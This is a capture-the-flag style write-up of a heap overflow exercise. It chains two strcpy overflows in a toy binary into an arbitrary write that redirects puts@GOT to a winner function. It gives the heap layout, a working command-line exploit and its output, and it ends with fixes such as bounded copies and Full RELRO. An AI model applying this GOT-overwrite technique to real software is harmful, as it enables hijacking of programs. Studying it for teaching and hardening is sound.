# ex11 — Two heap overflows chained into an arbitrary write on `puts@got`

Goal: `and we have a winner @ <time>`

## Assembly (paraphrased)

```
struct node { int val; struct node *next; };

main(argc, argv):
    a       = malloc(8);   a->val = 1;
    a->next = malloc(8);              /* uninitialised */
    b       = malloc(8);   b->val = 2;
    b->next = malloc(8);              /* uninitialised */

    strcpy(a->next, argv[1]);         /* VULN 1 — overflows chunk2 */
    strcpy(b->next, argv[2]);         /* used as arbitrary write   */
    puts("and that's a wrap folks!"); /* hijack target             */
```

`winner` (at **`0x08048494`**) calls `time(0)` and `printf("and we have
a winner @ %d\n", t)` — it's never called by `main`, so we have to make
`main` call it.

`main` ends with `puts(...)`. If we point `puts@got.plt` at `winner`,
that last call becomes `winner()`.

```
$ objdump -R ex11/bin | grep puts
08049774 R_386_JUMP_SLOT   puts@GLIBC_2.0
```

## Heap layout (from GDB, breakpoint just before the first strcpy)

```
a        = 0x804a1e0     (chunk1 user, holds {val=1, next=…})
a->next  = 0x804a1f0     (chunk2 user, 8 bytes)
b        = 0x804a200     (chunk3 user, holds {val=2, next=…})
b->next  = 0x804a210     (chunk4 user, 8 bytes)
```

Each `malloc(8)` reserves 16 bytes (8 header + 8 user), so the distance
from `a->next` to `b` is exactly **16 bytes**.

```
+---------- a->next (chunk2 user, 8 B) ----------+ +--- chunk3 header (8 B) ---+ +----- b (chunk3 user) -----+
| argv[1][0..7]                                  | | argv[1][8..15]            | | b.val | b.next |
+------------------------------------------------+ +---------------------------+ +---------------------------+
                                                                                    ^ argv[1][16..19]  argv[1][20..23]
```

Set `b->next` (bytes 20..23 of `argv[1]`) to **`&puts@got = 0x08049774`**.

Now the second `strcpy(b->next, argv[2])` writes wherever we told
`b->next` to be — i.e. straight into the GOT. Feed it the little-endian
bytes of `winner`:

```
argv[2] = "\x94\x84\x04\x08"
```

`strcpy` writes 4 bytes + a NUL. The NUL lands at `0x08049778`, which is
the start of `.data` (writable, unused) — harmless.

## Exploit

```bash
./ex11/bin \
  "$(python3 -c "import sys, struct
sys.stdout.buffer.write(b'A'*16 + b'BBBB' + struct.pack('<I', 0x08049774))")" \
  "$(python3 -c "import sys, struct
sys.stdout.buffer.write(struct.pack('<I', 0x08048494))")"
```

`argv[1]` breakdown:
- `A*16`  — 8 bytes of chunk2 user + 8 bytes of chunk3 header (junk,
  never re-read; no `free()` in this program so the size fields
  don't matter)
- `BBBB`  — overwrites `b.val` (unused after this point)
- `\x74\x97\x04\x08` — overwrites `b.next` with `&puts@got`

Neither argv arg contains a NUL, so both strcpys copy their full 24/4
bytes.

Output:
```
and we have a winner @ 1790524960
```

## Why we don't need `free()`/`unlink`

Classic heap exploitation on unpatched dlmalloc uses `free()` +
`unlink()` to gain arbitrary write. This program never frees, so we get
the same effect for free: the second `strcpy` is *itself* an arbitrary
write, because the code hands it a destination pointer we control.

## Fix

- The direct bug: replace both `strcpy(dst, srv)` with `strncpy` /
  `snprintf` bounded by the 8-byte chunk size (or a bigger, deliberate
  buffer).
- Structural fix: don't chain "read a pointer from a struct the user
  can overflow into, then write through that pointer." Validate or
  regenerate the pointer between the two strcpys.
- Turn on Full RELRO (`-Wl,-z,relro,-z,now`) so `puts@got` is read-only
  by the time `main` runs — even a working arbitrary write can't hit
  the GOT.
- Stack canaries wouldn't have helped here (heap bug), but ASLR + PIE
  would make the target addresses (winner, puts@got) unknown to the
  attacker without an info-leak first.
